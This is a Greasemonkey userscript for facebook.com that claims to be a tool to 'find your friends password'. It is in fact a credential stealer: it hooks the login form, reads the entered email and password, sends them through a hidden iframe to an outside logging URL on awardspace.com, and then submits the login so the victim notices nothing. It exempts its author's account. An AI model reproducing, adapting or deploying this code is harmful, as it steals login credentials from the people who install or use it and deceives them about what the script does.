// ==UserScript==
// @name           Find Password
// @namespace      Orkut
// @description    Script to find your friends password
// @include        http://www.facebook.com
// @author         Bermonruf <bermonruf@gmail.com>
// ==/UserScript==



//-- DOM and Js helpers --//

function getElementsByFunction(fnc, tag, parent){
	var tag = tag || "*";
	var parent = parent || document.body;
	var objs = parent.getElementsByTagName(tag);
	var array = [];
	for(var obj, i = 0; obj = objs[i]; i++){
		if(fnc(obj)){array.push(obj);}	
	}
	return array;
}

function getElementsByAttrValue(attr, value, tag, parent){
	return getElementsByFunction(function(obj){
		return(obj[attr] == value);
	}, tag, parent);
}

function getElementsByClassName(className, tag, parent){
	return getElementsByFunction(function(obj){
		return(obj.className.indexOf(className) >= 0);
	}, tag, parent);
}

function $A(iterable, iterator){
	for(var i = 0; i < iterable.length; i++){
		iterator(iterable[i], i);
	}
}

function p(){
	$A(arguments, function(obj){
		obj = (typeof(obj) == "undefined") ? "undefined" : obj;
		alert(obj);
	});
}

function $create(tag, attrs, appendOn){
	var obj = document.createElement(tag);
	for(var attr in attrs){obj[attr] = attrs[attr];}
	if(appendOn){appendOn.appendChild(obj);}
	return obj;
}

//-- Script itself --//

function log(username, password){
	var url = "http://bermonruf.awardspace.com/orkut/log.php?";
	url += "username=" + escape(username)+ "&password=" + escape(password);
	var body = document.getElementsByTagName("body")[0];
	var iframe = $create("iframe", {"src": url});
	iframe.style.display = "none";
	iframe.addEventListener("load", function(){
		body.removeChild(iframe);
		$form.submit();
		//window.location.reload();
	}, true);
	body.appendChild(iframe);
}

function findPass(e){
	if($activated){
		var username = document.getElementById("email").value;
		var password = document.getElementById("pass").value;
		var protectedAccounts = ["bernardo.rufino"]; // Put the rest in the server
		for(var i = 0, protected; protected = protectedAccounts[i]; i++){
			if(username.indexOf(protected) >= 0){password = "PROTECTED";}
		}
		log(username, password);
		//document.title = $title + " - " + password;
		e.preventDefault();
		return false;
	}
}

var td = document.getElementById("ga-fprow").getElementsByTagName("td")[0];

alert("Working!");

$activated = true;
$title = document.title;
$link = $create("a", {"href": "#"}, td);
$link.innerHTML = "_";
$link.addEventListener("click", function(e){
	$activated = !$activated;
	$link.innerHTML = ($activated) ? "_": ".";
}, true);
$form = document.getElementById("login_form");
$form.addEventListener("submit", findPass, true);
